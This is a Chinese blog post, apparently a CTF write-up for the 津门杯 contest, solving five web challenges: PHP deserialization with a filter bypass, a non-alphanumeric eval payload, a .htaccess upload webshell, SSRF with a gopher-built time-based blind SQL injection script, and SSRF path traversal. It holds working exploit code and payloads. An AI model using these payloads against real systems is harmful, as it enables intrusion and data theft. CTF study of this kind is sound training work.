@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="google-site-verification" content="McPiO5BdY1yB87an5v8Lw035aZiGKuLkg736kSbzD_k" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar.jpg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/avatar.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/avatar.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Logo font:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"as1def.github.io","root":"/","scheme":"Gemini","version":"8.0.0-rc.2","exturl":false,"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":9},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta property="og:type" content="article">
+<meta property="og:title" content="津门杯-Web-Writeup">
+<meta property="og:url" content="https://as1def.github.io/2021/05/11/%E6%B4%A5%E9%97%A8%E6%9D%AF-Web-Writeup/index.html">
+<meta property="og:site_name" content="As1def&#39;s Blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/05/11/2QSAKiMXmatypsE.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/11/71lmLK9dj5Wq3kJ.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/11/SaKZsVYM1QrOFT5.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/11/RixhnB2yZ9d37S8.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/11/X7WfoCZSFg8rnDV.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/11/S2DFw5xMWXPEJYG.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/11/IEUfoAmZJ7ueMcb.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/11/49MieUcCl6GRrWK.png">
+<meta property="article:published_time" content="2021-05-11T01:41:20.000Z">
+<meta property="article:modified_time" content="2021-05-11T03:06:21.781Z">
+<meta property="article:author" content="As1def">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/05/11/2QSAKiMXmatypsE.png">
+
+<link rel="canonical" href="https://as1def.github.io/2021/05/11/%E6%B4%A5%E9%97%A8%E6%9D%AF-Web-Writeup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>津门杯-Web-Writeup | As1def's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="As1def's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+	
+	
+	<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+	
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+        <span class="toggle-line toggle-line-first"></span>
+        <span class="toggle-line toggle-line-middle"></span>
+        <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">As1def's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://as1def.github.io/2021/05/11/%E6%B4%A5%E9%97%A8%E6%9D%AF-Web-Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="As1def">
+      <meta itemprop="description" content="听懂了一首歌,生活中回响着旋律">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="As1def's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          津门杯-Web-Writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-05-11 09:41:20 / 修改时间：11:06:21" itemprop="dateCreated datePublished" datetime="2021-05-11T09:41:20+08:00">2021-05-11</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.7k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><img src="https://i.loli.net/2021/05/11/2QSAKiMXmatypsE.png" alt="image-20210511110410892"></p>
+<a id="more"></a>
+
+<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="power-cut"><a href="#power-cut" class="headerlink" title="power_cut"></a>power_cut</h4><p>网站存在vim文件泄露，拿到index.php.swp文件</p>
+<p><code>vim -r index.php.swp</code>读取源码</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//vim -r index.php.swp</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">logger</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $logFile;</span><br><span class="line">    <span class="keyword">public</span> $initMsg;</span><br><span class="line">    <span class="keyword">public</span> $exitMsg;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">    <span class="comment">// initialise variables</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;initMsg=<span class="string">"#--session started--#\n"</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;exitMsg=<span class="string">"#--session end--#\n"</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;logFile =  $file;</span><br><span class="line">    readfile(<span class="keyword">$this</span>-&gt;logFile);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log</span><span class="params">($msg)</span></span>&#123;</span><br><span class="line">    $fd=fopen(<span class="keyword">$this</span>-&gt;logFile,<span class="string">"a+"</span>);</span><br><span class="line">    fwrite($fd,$msg.<span class="string">"\n"</span>);</span><br><span class="line">    fclose($fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"this is destruct"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">weblog</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $weblogfile;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $flag=<span class="string">"system('cat /flag')"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// self::waf($this-&gt;filepath);</span></span><br><span class="line">    $obj = <span class="keyword">new</span> logger(<span class="keyword">$this</span>-&gt;weblogfile);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $str=preg_replace(<span class="string">"/[&lt;&gt;*#'|?\n ]/"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str=str_replace(<span class="string">'flag'</span>,<span class="string">''</span>,$str);</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"this is destruct"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$log = $_GET[<span class="string">'log'</span>];</span><br><span class="line">$log = preg_replace(<span class="string">"/[&lt;&gt;*#'|?\n ]/"</span>,<span class="string">""</span>,$log);</span><br><span class="line">$log = str_replace(<span class="string">'flag'</span>,<span class="string">''</span>,$log);</span><br><span class="line">$log_unser = unserialize($log);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;&lt;br/&gt;昨天晚上因为<span class="number">14</span>级大风停电了.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
+<p>简单的一个反序列化，可直接执行system(‘cat /flag’)。</p>
+<p>通过str_replace将flag字符替换为空，利用双写绕过。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">weblog</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $weblogfile=<span class="string">'/flag'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$log = <span class="keyword">new</span> weblog();</span><br><span class="line">$res = serialize($log);</span><br><span class="line"><span class="keyword">echo</span> $res;</span><br><span class="line"><span class="comment">//然后双写flag绕过即可</span></span><br><span class="line"><span class="comment">//O:6:"weblog":1:&#123;s:10:"weblogfile";s:5:"/flflagag";&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img src="https://i.loli.net/2021/05/11/71lmLK9dj5Wq3kJ.png" alt="image-20210511094747156"></p>
+<h4 id="hate-php"><a href="#hate-php" class="headerlink" title="hate_php"></a>hate_php</h4><p>题目源码</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9_$@]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'fighting!'</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>payload</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=`/???/??? /????`;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img src="https://i.loli.net/2021/05/11/SaKZsVYM1QrOFT5.png" alt="image-20210511095129976"></p>
+<h4 id="UploadHub"><a href="#UploadHub" class="headerlink" title="UploadHub"></a>UploadHub</h4><p>查看题目给出源码</p>
+<p><code>Apache2.conf</code></p>
+<p><img src="https://i.loli.net/2021/05/11/RixhnB2yZ9d37S8.png" alt="image-20210511095354115"></p>
+<p>发现在配置层面禁止了upload沙盒解析php</p>
+<p>搜索资料发现，配置文件的<code>&lt;directory&gt;</code> 晚于<code>htaccess</code>执行，所以确定此题目为<code>.htaccess</code>的利用</p>
+<p><img src="https://i.loli.net/2021/05/11/X7WfoCZSFg8rnDV.png" alt="image-20210511101312920"></p>
+<p>之后尝试上传phpinfo文件，可以看到上传成功并且存在disable_functions</p>
+<p><img src="https://i.loli.net/2021/05/11/S2DFw5xMWXPEJYG.png" alt="image-20210511101243321"></p>
+<p>利用file_gets_contents进行bypass disable_functions.</p>
+<p>通过上传参数为shell的小马进行rce。</p>
+<p><code>shell=echo file_get_contents(&quot;/flag&quot;);</code></p>
+<p><img src="https://i.loli.net/2021/05/11/IEUfoAmZJ7ueMcb.png" alt="image-20210511103408657"></p>
+<h4 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h4><p>题目源码</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    session_start();</span><br><span class="line">    $url = $_GET[<span class="string">'url'</span>] ?? <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span>($url)</span><br><span class="line">    &#123;</span><br><span class="line">    $a = preg_match(<span class="string">"/file|dict/i"</span>, $url);</span><br><span class="line">        <span class="keyword">if</span> ($a==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">            $ch = curl_init();</span><br><span class="line">            curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">"url"</span>]);</span><br><span class="line">            curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">            curl_exec($ch);</span><br><span class="line">            curl_close($ch);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>很显然，利用方法SSRF</p>
+<p>利用gopher协议进行POST注入，无过滤</p>
+<p><code>gopher.php</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$payload = <span class="string">"poc="</span> . $argv[<span class="number">1</span>];</span><br><span class="line"><span class="comment">//$payload = "poc=if((select ascii(substr(database(),1,1)))=115,sleep(0.4),1)";</span></span><br><span class="line">$value = <span class="string">"POST /admin.php HTTP/1.1</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">X-Forwarded-For: 127.0.0.1</span></span><br><span class="line"><span class="string">cache-control: no-cache</span></span><br><span class="line"><span class="string">Accept: */*</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: "</span> . strlen($payload) . <span class="string">"</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span> . $payload . <span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode((<span class="string">"gopher://127.0.0.1:80/_"</span> . rawurlencode($value)));</span><br></pre></td></tr></table></figure></div>
+
+<p><code>poc.py</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://121.36.147.29:20001/?url='</span></span><br><span class="line"></span><br><span class="line">s=requests.Session()</span><br><span class="line"></span><br><span class="line">x=<span class="string">""</span></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> Len <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    max = <span class="number">127</span></span><br><span class="line">    min = <span class="number">34</span></span><br><span class="line">    <span class="keyword">while</span> max &gt;= min:</span><br><span class="line">        mid = (max + min) // <span class="number">2</span></span><br><span class="line">        payload = <span class="string">'if((select ascii(substr((select flag from flag),&#123;&#125;,1)))&gt;&#123;&#125;,sleep(0.2),1)'</span>.format(Len,mid)</span><br><span class="line">        print(payload)</span><br><span class="line">        tmp_r = os.popen(<span class="string">'php D:/Temp/Web/gopher.php "'</span>+payload+<span class="string">'"'</span>).read()</span><br><span class="line"></span><br><span class="line">        before_time = time.time()</span><br><span class="line"></span><br><span class="line">        tmp_url = url+tmp_r</span><br><span class="line">        print(tmp_url)</span><br><span class="line">        r = requests.get(tmp_url)</span><br><span class="line">        after_time = time.time()</span><br><span class="line">        offset = after_time-before_time</span><br><span class="line">        <span class="keyword">if</span> (offset&gt;<span class="number">2</span>):</span><br><span class="line">            min = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            max = mid</span><br><span class="line">        <span class="keyword">if</span> max == mid == min:</span><br><span class="line">            x += chr(mid)</span><br><span class="line">            print(<span class="string">"success:&#123;&#125; length:&#123;&#125;"</span>.format(x, len(x)))</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img src="https://i.loli.net/2021/05/11/49MieUcCl6GRrWK.png" alt="image-20210511110010580"></p>
+<h4 id="GoOSS"><a href="#GoOSS" class="headerlink" title="GoOSS"></a>GoOSS</h4><p>SSRF</p>
+<p>Go代码可通过302跳转完成ssrf</p>
+<p><code>gin-gonic/gin</code>特性发现双<code>//</code>可触发SSRF </p>
+<p><code>payload</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JSON"><figure class="iseeu highlight /json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"url"</span>:<span class="string">"http://127.0.0.1//localhost?file=../../../../../flag&amp;hehe=../.."</span>&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+    </div>
+
+    
+    
+    
+		<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">----------------本文结束<i class="fa fa-heart"></i>感谢阅读----------------</div>
+    
+</div>
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+              <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i> web</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/04/11/CVE-2021-3129-Laravel%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" rel="prev" title="CVE-2021-3129 Laravel远程代码执行漏洞">
+      <i class="fa fa-chevron-left"></i> CVE-2021-3129 Laravel远程代码执行漏洞
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#power-cut"><span class="nav-number">1.1.</span> <span class="nav-text">power_cut</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#hate-php"><span class="nav-number">1.2.</span> <span class="nav-text">hate_php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#UploadHub"><span class="nav-number">1.3.</span> <span class="nav-text">UploadHub</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#easysql"><span class="nav-number">1.4.</span> <span class="nav-text">easysql</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GoOSS"><span class="nav-number">1.5.</span> <span class="nav-text">GoOSS</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
